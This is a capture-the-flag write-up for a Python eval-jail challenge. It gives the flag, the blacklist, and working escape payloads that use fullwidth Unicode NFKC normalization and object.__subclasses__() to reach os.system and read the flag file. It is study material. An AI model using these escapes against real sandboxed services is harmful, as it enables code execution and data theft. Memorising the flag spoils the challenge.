---
title: one-line-wonder
category: misc
difficulty: medium
points: 100-500
author: s4l1
date: 2026-11-09
---
# Solution — one-line-wonder

**Flag:** `ingehack{n0rm4l1z4t10n_1s_n0t_4_s4ndb0x}`

---

## Step 1 — Read the rules

The service evaluates one line with `{"__builtins__": {}}`, so there is no
`open`, `__import__`, `getattr`, `chr`, or `breakpoint`. Before evaluation it
rejects the raw input if it contains any of:

```text
import  os  sys  open  eval  exec  __  subclasses  globals  flag
```

It also caps the line at 90 characters, and every failure is reported as
`blocked`. An audit hook refuses to open `/flag.txt`; nothing else is guarded.

## Step 2 — Bypass the substring blacklist

Two Unicode details stack up:

1. **Fullwidth letters.** `ｃｌａｓｓ` is a valid Python identifier and
   NFKC-normalizes to `class`. The raw line contains no ASCII `class`, so the
   blacklist passes it.
2. **Fullwidth underscores.** `＿` (U+FF3F, FULLWIDTH LOW LINE) also
   normalizes to `_`, but CPython's tokenizer does **not** accept it as an
   identifier character. On its own that is a `SyntaxError`. This jail,
   however, runs `unicodedata.normalize("NFKC", line)` *after* the blacklist
   check and *before* `eval`, so by the time the parser sees the line it is
   plain ASCII:

   ```text
   ＿＿ｃｌａｓｓ＿＿   ->   __class__
   ```

That ordering is the whole bug: the filter judges one string, the interpreter
executes a different one.

## Step 3 — Find a useful subclass

Start from a tuple and walk to `object`:

```text
().＿＿ｃｌａｓｓ＿＿.＿＿ｂａｓｅ＿＿.＿＿ｓｕｂｃｌａｓｓｅｓ＿＿()
```

The service prints the resulting list. Look for `os._wrap_close` and note its
index, `N`. That class is loaded because the jail itself imported `os` for the
audit hook.

## Step 4 — Recover a shell runner

`os._wrap_close.__init__.__globals__` is the `os` module dictionary. Its
`system` entry runs a shell, and the read happens in a child process the
Python audit hook never sees:

```text
().＿＿ｃｌａｓｓ＿＿.＿＿ｂａｓｅ＿＿.＿＿ｓｕｂｃｌａｓｓｅｓ＿＿()[N].＿＿ｉｎｉｔ＿＿.＿＿ｇｌｏｂａｌｓ＿＿['sy'+'stem']('cat /f*')
```

Notes:

- `'sy'+'stem'` produces the dictionary key `system` without ever containing
  the ASCII substring `sys`.
- `cat /f*` matches `/flag.txt` and a decoy `/flag_old.txt`; skip the decoy
  line. (`cat</f*` fails: dash does not glob redirection words.)
- `open()`, `io.FileIO`, and `os.open` all raise the `open` audit event, so
  they stay blocked. `os.system` is the uncovered path.

Send it (the index is whatever Step 3 printed):

```text
printf '%s\n' "().＿＿ｃｌａｓｓ＿＿.＿＿ｂａｓｅ＿＿.＿＿ｓｕｂｃｌａｓｓｅｓ＿＿()[156].＿＿ｉｎｉｔ＿＿.＿＿ｇｌｏｂａｌｓ＿＿['sy'+'stem']('cat /f*')" \
  | openssl s_client -quiet \
      -connect one-line-wonder.challs.ingeniums.club:9450 \
      -servername one-line-wonder.challs.ingeniums.club
```

That payload is 88 characters with a three-digit index, so it fits under the
90-character cap. `flag.txt` prints the flag; `flag_old.txt` prints the decoy.

`solution/solve.py` automates the two steps (enumerate, then exploit).

---

## Skills learned

| Step | Skill |
|---|---|
| 1 | Reading a sandbox's rules and noticing what is *not* blocked |
| 2 | Unicode NFKC normalization as a filter bypass |
| 3 | Walking `object.__subclasses__()` when builtins are gone |
| 4 | Distinguishing a Python audit hook from an OS-level sandbox |

## Author notes

- The index in the writeup depends on the Python build and the jail's imports.
  Always enumerate on the live service; `solve.py` does exactly that.
- The blacklist runs on the raw line and the normalization runs afterwards.
  Reversing those two lines makes `＿＿` a syntax error and the challenge
  unsolvable, so keep the order.
- The decoy `/flag_old.txt` exists so a player (or an agent) that blindly cats
  everything gets a plausible-looking wrong answer.
- Error messages are deliberately generic: every failure prints `blocked`.

## References

- PEP 3131, non-ASCII identifiers and NFKC normalization:
  <https://peps.python.org/pep-3131/>
- CPython audit events table (`open`, `os.system`, `subprocess.Popen`):
  <https://docs.python.org/3/library/audit_events.html>
- PEP 578, Python audit hooks (process-local, not a sandbox):
  <https://peps.python.org/pep-0578/>
